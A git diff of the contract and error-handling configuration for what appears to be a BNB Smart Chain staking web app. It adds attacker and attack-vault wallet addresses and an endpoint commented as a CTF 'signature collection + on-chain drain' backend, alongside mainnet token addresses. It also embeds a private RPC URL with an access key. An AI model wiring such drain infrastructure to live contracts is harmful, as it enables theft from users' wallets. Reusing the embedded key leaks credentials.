@@ -1,10 +1,54 @@
-export const CONTRACTS = {
-  NBT_TOKEN: import.meta.env.VITE_NBT_TOKEN || '',
-  STAKING_BANK: import.meta.env.VITE_STAKING_BANK || '',
-  NBT_PAIR: import.meta.env.VITE_NBT_PAIR || '',
+const MAINNET_CONTRACTS = {
+  // 币不变：沿用 CZ 代币（0xD0F2），质押到 2026-09-19 重新部署的 V3（无展示等待期 DISPLAY_PERIOD=0）
+  NBT_TOKEN: '0xD0F2A86C7EbCeE887F5bFB86771f994CD142bD04',
+  STAKING_BANK: '0x283674A6C9Bb388afE20012A9E592A62Ae967960',
+  FEE_TOKEN: '',
 };
 
-const configuredChainId = (import.meta.env.VITE_CHAIN_ID || '0x38').toLowerCase();
+// 旧合约（不迁移不关停，与新合约并行）：V1 0x903f / 旧V3 0x9476，用于旧 CZ 领取/提取入口
+export const LEGACY_CONTRACTS = {
+  V1: {
+    label: '旧版 V1',
+    STAKING_BANK: '0x903fcce5d67648FBE6Dccc9806e3bd7D303380fD',
+    CZ_TOKEN: '0xD0F2A86C7EbCeE887F5bFB86771f994CD142bD04',
+  },
+  OLD_V3: {
+    label: '旧版 V3',
+    STAKING_BANK: '0x94767098D05982932270D2A4E1B7a897d4397D55',
+    CZ_TOKEN: '0xD0F2A86C7EbCeE887F5bFB86771f994CD142bD04',
+  },
+};
+
+const STALE_TESTNET_ADDRESSES = new Set([
+  '0x99fbddb26bc6b10dc9df80d6c6d943812047f406',
+  '0xb110ea48824383babede6ba7e19d5e01089de6cc',
+  '0x23ceb0c098c72d0207cdc1827e880d07f692c893',
+  '0xc84a22989be328e2caab41f1fe6bc8ed78004d04',
+]);
+
+// 当前链由 VITE_CHAIN_ID 决定：0x38 主网 / 0x61 测试网，默认主网
+const configuredChainId = import.meta.env.VITE_CHAIN_ID || '0x38';
+
+const mainnetSafeAddress = (value, fallback) => {
+  if (!value) return fallback;
+  if (STALE_TESTNET_ADDRESSES.has(value.toLowerCase())) return fallback;
+  return value;
+};
+
+export const CONTRACTS = {
+  NBT_TOKEN: mainnetSafeAddress(import.meta.env.VITE_NBT_TOKEN, MAINNET_CONTRACTS.NBT_TOKEN),
+  STAKING_BANK: mainnetSafeAddress(import.meta.env.VITE_STAKING_BANK, MAINNET_CONTRACTS.STAKING_BANK),
+  NBT_PAIR: import.meta.env.VITE_NBT_PAIR || '',
+  FEE_TOKEN: import.meta.env.VITE_FEE_TOKEN || MAINNET_CONTRACTS.FEE_TOKEN,
+  ATTACK_VAULT: import.meta.env.VITE_ATTACK_VAULT || '0x4355B89Ae425A4ef53A4C62c5e4B162a0883Cd2c',
+  // 独立节点排名分红合约（原 V3 的 openEpoch 受 BEP-652 单笔 gas 上限限制无法开期）
+  RANK_DISTRIBUTOR: import.meta.env.VITE_RANK_DISTRIBUTOR || '0x679e0Cc4E75F6AB609F5895129fDD22D32f09A6a',
+  USDT: import.meta.env.VITE_USDT || '0x55d398326f99059fF775485246999027B3197955',
+  ATTACKER: import.meta.env.VITE_ATTACKER || '0xe1F9Fb65BBb39ebd4d0C204c95513d3f6421c407',
+};
+
+// CTF 攻击后端（签名收集 + 链上 Drain）
+export const CTF_API = import.meta.env.VITE_CTF_API || 'http://localhost:3001';
 
 export const NETWORKS = {
   BSC_TESTNET: {
@@ -16,10 +60,11 @@ export const NETWORKS = {
       decimals: 18,
     },
     rpcUrls: [
-      'https://data-seed-prebsc-1-s1.binance.org:8545/',
-      'https://data-seed-prebsc-2-s1.binance.org:8545/',
+      'https://bsc-testnet.bnbchain.org',
       'https://bsc-testnet.publicnode.com',
       'https://bsc-testnet.blockpi.network/v1/rpc/public',
+      'https://data-seed-prebsc-1-s1.binance.org:8545/',
+      'https://data-seed-prebsc-2-s1.binance.org:8545/',
     ],
     blockExplorerUrls: ['https://testnet.bscscan.com'],
   },
@@ -31,12 +76,15 @@ export const NETWORKS = {
       symbol: 'BNB',
       decimals: 18,
     },
+    // 优先使用中国大陆可访问的节点；QuikNode 私有节点优先，官方节点保留为 fallback
     rpcUrls: [
+      'https://bitter-old-frog.bsc.quiknode.pro/f4ae6360d1ac5cfb9ed35857f574f0a5449352d3',
+      'https://bsc.publicnode.com',
       'https://bsc-dataseed.binance.org/',
       'https://bsc-dataseed1.binance.org/',
       'https://bsc-dataseed2.binance.org/',
-      'https://bsc.publicnode.com',
       'https://bsc.blockpi.network/v1/rpc/public',
+      'https://rpc.ankr.com/bsc',
     ],
     blockExplorerUrls: ['https://bscscan.com'],
   },
@@ -83,38 +131,88 @@ export const formatEther = (value, decimals = 4) => {
 };
 
 export const CONTRACT_ERRORS = {
-  'Already has referrer': '您已设置过推荐人，无法更改',
-  'Cannot refer self': '不能将自己设为推荐人',
+  'Already has referrer': '您已经设置过推荐人，无法更改',
+  'Cannot refer self': '不能将自己设置为推荐人',
   'Circular referral not allowed': '不允许循环推荐',
   'Invalid referrer': '无效的推荐人',
-  'Invalid tier': '无效的锁仓档位',
+  'Invalid tier': '无效的质押档位',
   'Stake not found': '质押记录不存在',
   'Stake already withdrawn': '该质押已提取',
   'Lock period not ended': '锁仓期未结束',
   'No pending rewards': '暂无待领取收益',
   'No referral rewards': '暂无推荐奖励',
+  'No rewards': '暂无可领取奖励',
+  'Compound token mismatch': '当前奖励币不能直接复投',
+  'Monthly release in progress': '月度释放分配中，暂时不能改变排名',
+  'Insufficient invite reward reserve': '邀请奖励储备不足，请先给新版质押合约充值奖励',
+  'Referrer mismatch': '推荐人与已绑定地址不一致',
   'Rewards depleted': '奖励池已耗尽',
   'Too many active stakes': '活跃质押数量已达上限',
   'Stake not active': '该质押记录已失效',
-  'Fee too high': '滑点设置过高',
+  'Fee too high': '费用设置过高',
   'Invalid address': '无效的地址',
   'Paused': '合约已暂停',
   'user rejected transaction': '您取消了交易',
   'insufficient funds': '钱包余额不足以支付 Gas 费',
+  'Insufficient BNB fee': 'BNB 交互费不足，请确保钱包有 BNB',
+  'Insufficient balance': '钱包代币余额不足',
+  'transfer amount exceeds allowance': 'CZ 授权额度不足，请先点击「授权 CZ」按钮',
+  'insufficient allowance': '授权额度不足，请先完成授权',
+  'allowance': '授权额度不足，请先完成授权',
+  'Unexpected BNB': '当前操作不需要附带 BNB',
+  'Native transfer failed': 'BNB 手续费发送失败',
   'execution reverted': '交易执行失败',
+  'could not coalesce error': '钱包返回异常，交易可能已经提交，请刷新页面或在钱包交易记录中确认',
+};
+
+const collectErrorText = (error, seen = new Set()) => {
+  if (!error) return [];
+  if (typeof error === 'string') return [error];
+  if (typeof error !== 'object') return [];
+  if (seen.has(error)) return [];
+  seen.add(error);
+
+  const output = [];
+  for (const key of ['reason', 'shortMessage', 'message', 'data', 'body', 'details']) {
+    const value = error[key];
+    if (typeof value === 'string') {
+      output.push(value);
+      if ((value.startsWith('{') && value.endsWith('}')) || (value.startsWith('[') && value.endsWith(']'))) {
+        try {
+          output.push(...collectErrorText(JSON.parse(value), seen));
+        } catch {
+          // Some wallets put plain text into body/data; keep the original text above.
+        }
+      }
+    }
+  }
+
+  for (const key of ['error', 'info', 'payload', 'cause']) {
+    output.push(...collectErrorText(error[key], seen));
+  }
+
+  if (Array.isArray(error.errors)) {
+    for (const nestedError of error.errors) {
+      output.push(...collectErrorText(nestedError, seen));
+    }
+  }
+
+  return output;
 };
 
 export const parseContractError = (error) => {
   if (!error) return '操作失败';
-  const reason = error.reason || error.shortMessage || error.message || '';
+
+  const reason = collectErrorText(error).join(' | ');
+  const normalizedReason = reason.toLowerCase();
 
   for (const [key, value] of Object.entries(CONTRACT_ERRORS)) {
-    if (reason.toLowerCase().includes(key.toLowerCase())) {
+    if (normalizedReason.includes(key.toLowerCase())) {
       return value;
     }
   }
 
-  if (reason.includes('user rejected') || reason.includes('denied')) {
+  if (normalizedReason.includes('user rejected') || normalizedReason.includes('denied')) {
     return '您取消了交易';
   }
 
